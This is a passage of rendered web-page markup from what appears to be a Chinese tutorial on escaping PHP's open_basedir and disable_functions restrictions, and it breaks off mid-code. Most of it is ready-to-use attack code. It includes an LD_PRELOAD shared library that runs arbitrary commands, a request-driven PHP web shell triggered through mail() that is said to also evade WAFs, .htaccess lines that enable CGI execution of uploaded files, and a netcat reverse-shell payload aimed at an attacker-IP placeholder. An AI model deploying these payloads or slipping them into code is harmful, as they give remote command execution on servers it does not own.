punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("但是命令执行函数一般都会被限制在disable_function当中，所以我们需要寻找其他的途径来绕过限制")]),s._v(" "),a("h3",{attrs:{id:"_2、glob-数据流包装器"}},[s._v("2、glob:// 数据流包装器 "),a("a",{staticClass:"header-anchor",attrs:{href:"#_2、glob-数据流包装器"}},[s._v("#")])]),s._v(" "),a("blockquote",[a("p",[s._v("glob是用来筛选目录的伪协议，筛选时不受"),a("code",[s._v("open_basedir")]),s._v("制约")])]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$b")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("opendir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"glob:///var/www/html/*.php"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("while")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("readdir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token boolean constant"}},[s._v("false")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"filename:"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$file")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("closedir")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$b")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[s._v("更多方法参见"),a("a",{attrs:{href:"https://www.leavesongs.com/PHP/php-bypass-open-basedir-list-directory.html",target:"_blank",rel:"noopener noreferrer"}},[s._v("P牛的博客"),a("OutboundLink")],1)]),s._v(" "),a("h1",{attrs:{id:"绕过disable-fuction"}},[s._v("绕过disable_fuction "),a("a",{staticClass:"header-anchor",attrs:{href:"#绕过disable-fuction"}},[s._v("#")])]),s._v(" "),a("h3",{attrs:{id:"利用dl-函数"}},[a("strong",[s._v("利用DL()函数")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#利用dl-函数"}},[s._v("#")])]),s._v(" "),a("p",[s._v("dl( ) 函数允许在php脚本里动态加载php模块，默认是加载extension_dir目录里的扩展")]),s._v(" "),a("p",[s._v("该选项是PHP_INI_SYSTEM范围可修改的，只能在php.ini或者apache主配置文件里修改。")]),s._v(" "),a("p",[s._v("也可以通过enable_dl选项来关闭动态加载功能，而这个选项默认为On的")]),s._v(" "),a("p",[s._v("可以用"),a("code",[s._v("../")]),s._v("这种目录遍历的方式指定加载任何一个目录里的so等扩展文件")]),s._v(" "),a("p",[s._v("所以我们可以上传自己的so文件，并且用dl函数加载这个so文件执行命令")]),s._v(" "),a("h3",{attrs:{id:"ld-preload-环境变量"}},[a("strong",[s._v("LD_PRELOAD 环境变量")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#ld-preload-环境变量"}},[s._v("#")])]),s._v(" "),a("p",[s._v("LD_PRELOAD 是Linux的环境变量，它允许定义在程序运行前优先加载的动态链接库")]),s._v(" "),a("p",[s._v("在php中，可使用putenv()函数设置LD_PRELOAD环境变量来加载指定的so文件")]),s._v(" "),a("p",[s._v("so文件中包含自定义函数进行劫持从而达到执行恶意命令的目的。")]),s._v(" "),a("div",{staticClass:"language-c line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-c"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//bypass_disablefuc.c")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("define")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token expression"}},[s._v("_GNU_SOURCE")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdlib.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<stdio.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token macro property"}},[a("span",{pre:!0,attrs:{class:"token directive-hash"}},[s._v("#")]),a("span",{pre:!0,attrs:{class:"token directive keyword"}},[s._v("include")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("<string.h>")])]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("extern")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" environ"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("__attribute__")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("__constructor__"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("preload")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("void")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("const")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("char")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("*")]),s._v(" cmdline "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("getenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"EVIL_CMDLINE"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("if")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("getenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"LD_PRELOAD"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("NULL")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("{")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("return")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unsetenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"LD_PRELOAD"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmdline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n    "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("system")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("cmdline"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("}")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//编译成动态链接库")]),s._v("\ngcc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("shared "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("fPIC bypass_disablefuc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("c "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("o bypass_disablefunc_x64"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("so\n    \n"),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//若目标为 x86 架构，需要加上 -m32")]),s._v("\ngcc "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("shared "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("fPIC bypass_disablefuc"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("c "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("m32 "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("o bypass_disablefunc_x32"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v("so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br"),a("span",{staticClass:"line-number"},[s._v("16")]),a("br"),a("span",{staticClass:"line-number"},[s._v("17")]),a("br"),a("span",{staticClass:"line-number"},[s._v("18")]),a("br"),a("span",{staticClass:"line-number"},[s._v("19")]),a("br"),a("span",{staticClass:"line-number"},[s._v("20")]),a("br"),a("span",{staticClass:"line-number"},[s._v("21")]),a("br")])]),a("p",[s._v("再写一个PHP， 用putenv添加环境变量(一个是上传的so库地址、一个是要执行的命令)。")]),s._v(" "),a("p",[s._v("将system命令输出内容写入指定文件，然后读出。")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[s._v("//bypass_disablefunc.php \n"),a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n \t"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<p> <b>example</b>: http://site.com/bypass_disablefunc.php?cmd=pwd&outpath=/tmp/xx&sopath=/var/www/html/bypass_disablefunc_x64.so </p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\n\t"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"cmd"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"outpath"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$evil_cmdline")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('" > "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('" 2>&1"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<p> <b>cmdline</b>: "')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$evil_cmdline")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"</p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("putenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"EVIL_CMDLINE="')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$evil_cmdline")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$so_path")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$_REQUEST")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"sopath"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("putenv")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"LD_PRELOAD="')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$so_path")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("mail")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('""')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n   "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("echo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"<p> <b>output</b>: <br />"')]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("nl2br")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file_get_contents")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"</p>"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n\t"),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("unlink")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$out_path")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("?>")])]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br"),a("span",{staticClass:"line-number"},[s._v("13")]),a("br"),a("span",{staticClass:"line-number"},[s._v("14")]),a("br"),a("span",{staticClass:"line-number"},[s._v("15")]),a("br")])]),a("p",[s._v("将编译成的"),a("strong",[s._v("动态链接库")]),s._v("和"),a("strong",[s._v("php文件")]),s._v("上传到目标网站根目录。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("#用法如下")]),s._v("\nhttp://xx.com/bypass_disablefunc.php?cmd"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("ls"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("outpath")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/tmp/ss"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("sopath")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/var/www/html/bypass_disablefunc_x64.so\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("PHP 支持putenv()、mail() 即可，甚至无需安装 sendmail。 ("),a("strong",[s._v("此方法还可用于过WAF")]),s._v(")")])]),s._v(" "),a("h3",{attrs:{id:"fastcgi-php-fpm"}},[a("strong",[s._v("Fastcgi/PHP-FPM")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#fastcgi-php-fpm"}},[s._v("#")])]),s._v(" "),a("p",[s._v("Fastcgi 是一种通讯协议，用于Web服务器与后端语言的数据交换；")]),s._v(" "),a("p",[s._v("PHP-FPM 则是php环境中对Fastcgi协议的管理程序实现")]),s._v(" "),a("p",[s._v("Nginx为fastcgi 提供了 fastcgi_param 来主要处理映射关系，将 Nginx 中的变量翻译成 PHP 能够理解的变量")]),s._v(" "),a("p",[a("a",{attrs:{href:"https://github.com/AntSwordProject/ant_php_extension",target:"_blank",rel:"noopener noreferrer"}},[s._v("蚁剑扩展"),a("OutboundLink")],1),s._v("，用相应版本php编译即可")]),s._v(" "),a("h3",{attrs:{id:"apache-mod-cgi"}},[a("strong",[s._v("Apache Mod CGI")]),s._v(" "),a("a",{staticClass:"header-anchor",attrs:{href:"#apache-mod-cgi"}},[s._v("#")])]),s._v(" "),a("p",[s._v("Mod CGI就是把PHP做为APACHE一个内置模块，")]),s._v(" "),a("p",[s._v("让apache http服务器本身能够支持PHP语言，不需要每一个请求都通过启动PHP解释器来解释PHP")]),s._v(" "),a("p",[s._v("它可以将cgi-script文件或者用户自定义标识头为cgi-script的文件通过服务器运行")]),s._v(" "),a("p",[s._v("在phpinfo看到"),a("code",[s._v("Server API -> CGI/FastCGI")]),s._v("，就可以确定是以cgi模式运行的了。")]),s._v(" "),a("p",[a("strong",[s._v("要求")])]),s._v(" "),a("blockquote",[a("ol",[a("li",[s._v("apache且运行mod_cgi模式")]),s._v(" "),a("li",[s._v("web目录可写")]),s._v(" "),a("li",[s._v("允许.htaccess生效")])])]),s._v(" "),a("p",[s._v("在.htaccess 中添加以下内容，指定.dazzle为结尾的文件为CGI脚本程序并且允许本目录执行，我们只要同时上传一个.dazzle的shell就可以了。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("Options +ExecCGI\nAddHandler cgi-script .dizzle\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("p",[s._v("现成payload - 》反弹shell：")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token php language-php"}},[a("span",{pre:!0,attrs:{class:"token delimiter important"}},[s._v("<?php")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v("\"nc -c '/bin/bash' 攻击者IP 6666\"")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//command to be executed")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"#!/bin/bash\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//using a shellscript")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"echo -ne \\"Content-Type: text/html\\\\n\\\\n\\"\\n"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//header is needed, otherwise a 500 error is thrown when there is output")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$shellfile")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(".")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token double-quoted-string string"}},[s._v('"'),a("span",{pre:!0,attrs:{class:"token interpolation"}},[a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$cmd")])]),s._v('"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token comment"}},[s._v("//executing $cmd")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("function")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("checkEnabled")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$text")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$condition")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token variable"}},[s._v("$yes")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(",")]),a("span",{pre:!0,attrs:{class:"token 